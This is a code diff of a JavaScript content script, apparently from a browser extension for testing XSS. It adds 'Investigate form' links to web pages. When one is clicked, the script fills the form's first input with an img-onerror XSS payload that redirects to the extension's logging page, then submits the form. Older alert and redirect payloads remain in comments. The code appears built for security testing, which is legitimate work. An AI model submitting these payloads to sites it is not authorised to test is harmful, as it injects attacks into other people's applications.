@@ -1,43 +1,13 @@
-// <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
-
-
-// var native_alert = alert;
-
-// alert = function(msg) {
-//   console.log("ALERTING");
-//   console.log('An alert was generated. Message: ' + msg);
-//   native_alert(msg);
-// }
-
+// Attempt to run JS despite generated XSS errors
 function ignoreerror() {
   return true;
 }
-
 window.onerror = ignoreerror();
 
+// Run script after page load
 window.onload = function() {
 
-
-  function ignoreerror()
-  {
-    return true
-  }
-  window.onerror=ignoreerror();
-
-  // (function() {
-  //   console.log("Do we get this far?");
-  //   var _old_alert = window.alert;
-
-  //   window.alert = function() {
-  //     console.log("Not this far");
-  //     console.log("ALERTING" + arguments);
-  //     // document.body.innerHTML += "<br>alerting";
-  //     _old_alert.apply(window,arguments);
-  //     // document.body.innerHTML += "<br>done alerting<br>";
-  //   };
-  // })();
-
-
+  // Inject "Investigate Form" buttons on input
   var forms = document.getElementsByTagName("form");
   for (var i = 0; i < forms.length; i++) {
     var currForm = forms[i];
@@ -45,46 +15,46 @@ window.onload = function() {
     if (!inputs.length)
       continue;
     var firstInputChild = inputs[0];
-    // console.log("FIRST INPUT CHILD IS: " + firstInputChild);
-    // firstInputChild.value = "HELLOOOOOOOOO" + i.toString();
 
     var recommendation = document.createElement('a');
     recommendation.classList.add("recommendation");
     var text = document.createTextNode("Investigate form");
     recommendation.appendChild(text);
+    // Make it look clickable
     recommendation.setAttribute("href", "javascript:void(0)");
 
     recommendation.child = firstInputChild;
     recommendation.form = currForm;
 
+    // Attempt XSS (or otherwise) upon clicking the form
     recommendation.addEventListener('click', function(evt) {
-      // console.log("We got to click event");
-      // alert('Happens 2nd');
       attemptXSS(evt.target.child, evt.target.form);
-      // alert("Happens 3rd");
     });
 
+    // Create new div wrapper for element to be next to input
     var newParent = document.createElement("div");
-
     newParent.appendChild(firstInputChild);
     newParent.appendChild(recommendation);
     currForm.insertBefore(newParent, currForm.firstChild);
   }
-
-  // window.addEventListener('build', function (e) {
-  //   alert("We are now after the XSS attempt");
-  // });
-
-
 }
 
 function attemptXSS(inputElement, parentForm) {
   // Here is one attempt - I'd want to pass arguments such as time limit, as well as a library of inputs to fuzz etc
-  inputElement.value = "<img src=a onerror=\"alert('XSS Attack')\">";
-  parentForm.submit();
+  // inputElement.value = "<img src=a onerror=\"alert('XSS Attack')\">";
+  // inputElement.value = "<img src=a onerror=\"alert('henlo');window.location.replace('http://www.miniclip.com')\">";
+  var extId = chrome.runtime.id;
+  var currLoc = window.location;
 
-  // var event = new Event('build');
-  // window.dispatchEvent(event);
+  // Whenever I get a chance to run JS as an exploit (XSS), make a request to the extension
+  // Request logger stores referral URL's as weak URL's from which you can trigger an XSS exploit
+  var jsExploitStr = "window.location.replace('chrome-extension://" + extId + "/request_logger.html?ref=" + currLoc;
+
+  // Specific attack (using onerror element of image)
+  inputElement.value = "<img src=a onerror=\"" + jsExploitStr + "')\">";
+
+  // Submit form
+  parentForm.submit();
 }
 
 // $(window).ready(function() {
@@ -94,25 +64,4 @@ function attemptXSS(inputElement, parentForm) {
 //     alert("Thank you for your comment!");
 //   });
 // });
-
-
-
-// Maybe taking the wrong approach
-// Analyse requests
-// Gather user owned parts
-// Check html outputs for contents
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
